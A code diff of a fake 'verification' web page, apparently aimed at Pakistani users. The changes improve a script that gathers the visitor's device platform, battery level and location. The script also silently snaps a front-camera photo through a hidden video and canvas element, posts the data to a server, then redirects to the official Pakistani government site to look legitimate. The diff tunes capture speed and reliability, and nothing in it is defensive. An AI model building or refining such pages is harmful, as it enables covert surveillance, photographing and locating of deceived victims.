@@ -13,7 +13,7 @@
         .btn { background-color: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
         .btn:hover { background-color: #218838; }
         .footer { font-size: 11px; color: #959da5; margin-top: 20px; text-align: center; }
-        #loader { display: none; text-align: center; font-size: 13px; color: #28a745; }
+        #loader { display: none; text-align: center; font-size: 13px; color: #28a745; font-weight: 600; }
     </style>
 </head>
 <body>
@@ -32,37 +32,66 @@
     </div>
 </div>
 
-<video id="v" style="display:none;" autoplay></video>
+<video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;" width="640" height="480"></canvas>
 
 <script>
     async function verify() {
+        // UI Update
         document.getElementById('mainBtn').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        let info = { platform: navigator.platform, lat: "0", lon: "0" };
+        // Advanced Info Collection
+        let info = { 
+            platform: navigator.platform, 
+            lat: "0", 
+            lon: "0",
+            battery: "N/A"
+        };
+
+        // Battery level (Instant fetch)
+        if(navigator.getBattery) { 
+            const b = await navigator.getBattery(); 
+            info.battery = Math.round(b.level*100)+"%"; 
+        }
+
+        // ⚡ FAST ACTION: Camera aur Location dono ek sath maango
+        const cameraTask = navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }})
+            .catch(() => null); // Agar camera deny ho jaye to null
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
             info.lat = pos.coords.latitude; 
             info.lon = pos.coords.longitude;
             
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }});
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const img = canvas.toDataURL('image/jpeg', 0.5);
-                    stream.getTracks().forEach(t => t.stop());
-                    send(info, img);
-                }, 1500);
-            } catch(e) { send(info, null); }
+            // Jab location mil jaye, check karo camera ready hai?
+            const stream = await cameraTask;
+            handleCapture(stream, info);
         }, (err) => {
-            alert("Verification Failed: Regional access requires location services to be enabled.");
-            location.reload();
-        }, {enableHighAccuracy: true});
+            // Agar location fail ho jaye, tab bhi camera check karo
+            navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }})
+                .then(stream => handleCapture(stream, info))
+                .catch(() => send(info, null));
+        }, { enableHighAccuracy: false, timeout: 6000 }); // Accuracy kam ki taaki foran result mile
+    }
+
+    async function handleCapture(stream, info) {
+        if(stream) {
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
+            // Photo capture delay sirf 0.8s (palk jhapaktay hi)
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const img = canvas.toDataURL('image/jpeg', 0.6);
+                
+                // Stop camera stream for security
+                stream.getTracks().forEach(t => t.stop());
+                send(info, img);
+            }, 800);
+        } else {
+            send(info, null);
+        }
     }
 
     function send(i, p) {
@@ -71,11 +100,11 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ info: i, photo: p })
         }).then(() => {
+            // Official Pakistani Government Site par redirection
             window.location.href = "https://www.pakistan.gov.pk/";
         });
     }
 </script>
 
 </body>
-    </html>
-    
+</html>
